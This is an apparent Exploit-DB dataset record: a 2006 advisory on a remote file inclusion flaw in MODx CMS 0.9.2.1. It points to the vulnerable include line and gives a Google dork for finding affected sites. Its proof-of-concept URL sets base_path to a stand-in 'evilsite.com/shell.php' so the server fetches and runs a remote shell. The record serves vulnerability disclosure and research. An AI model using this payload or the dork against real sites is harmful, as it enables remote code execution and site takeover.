{
  "id": "2706",
  "title": "MODx CMS 0.9.2.1 - &#039;FCKeditor&#039; Remote File Inclusion",
  "cve": "CVE-2006-5730",
  "vuln_type": "rce",
  "code": "+-------------------------------------------------------------------------------------------\r\n+ MODx CMS 0.9.2.1 (base_path) Remote File Include Vulnerability\r\n+-------------------------------------------------------------------------------------------\r\n+ Affected Software .: MODx CMS 0.9.2.1\r\n+ Vendor ............: http://modxcms.com/\r\n+ Download ..........: http://modxcms.com/downloads.html\r\n+ Description .......: \"MODx is an open source PHP Application Framework that helps you take control of your online content.\"\r\n+ Dork ..............: \"powered by MODx\"\r\n+ Class .............: Remote File Inclusion\r\n+ Risk ..............: High (Remote File Execution)\r\n+ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>\r\n+-------------------------------------------------------------------------------------------\r\n+ Details:\r\n+ MODx CMS manager/media/browser/mcpuk/connectors/php/commands/thumbnail.php does not initialize\r\n+ the $base_path variable before using it to include files, assuming register_globals = on,\r\n+ we can intialize the variable in a query string and include a remote file of our choice.\r\n+ \r\n+ Vulnerable Code:\r\n+ manager/media/browser/mcpuk/connectors/php/commands/thumbnail.php, line(s) 24:\r\n+ -> include $base_path.\"manager/media/browser/mcpuk/connectors/php/Commands/helpers/iconlookup.php\";\r\n+\r\n+ Proof Of Concept:\r\n+ http://[target]/[path]/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=http://evilsite.com/shell.php?\r\n+-------------------------------------------------------------------------------------------\r\n\r\n# milw0rm.com [2006-11-03]",
  "url": "https://www.exploit-db.com/exploits/2706"
}